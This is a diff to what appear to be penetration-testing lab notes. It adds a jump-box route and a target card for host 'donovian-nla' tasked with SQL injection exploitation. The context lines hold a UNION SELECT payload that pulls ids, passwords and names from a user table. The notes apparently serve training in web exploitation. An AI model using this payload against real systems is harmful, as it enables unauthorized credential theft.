@@ -72,7 +72,22 @@ ________________________________________________________________________________
 #### Now able to alter options to pull back specific data.
     10.50.33.78/uniondemo.php?Selection=3 UNION SELECT id,pass,name FROM session.user
 _________________________________________________________________________________________________________________
+## Scheme of Maneuver:
+### >Jump Box
+### ->T1:10.100.28.48
 
+## Target Section:
+
+### T1
+#### Hostname: donovian-nla
+#### IP: 10.100.28.48
+#### OS: unknown
+#### Creds:unknown
+#### Last Known SSH Port: unknown
+#### Last Known HTTP Port: 80
+#### PSP: Unknown
+#### Malware: Unknown
+#### Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
 
 _________________________________________________________________________________________________________________
 
